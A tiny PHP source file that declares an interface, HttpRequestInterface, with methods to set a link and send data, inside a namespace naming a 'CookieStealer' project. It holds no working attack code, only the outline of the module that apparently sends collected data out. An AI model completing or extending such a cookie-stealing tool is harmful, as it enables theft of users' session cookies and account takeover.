<?php

namespace Cvar1984\CookieStealer\Modules\Interface;

interface HttpRequestInterface
{
	public function setLink($link);
	public function send($optimizedData);
}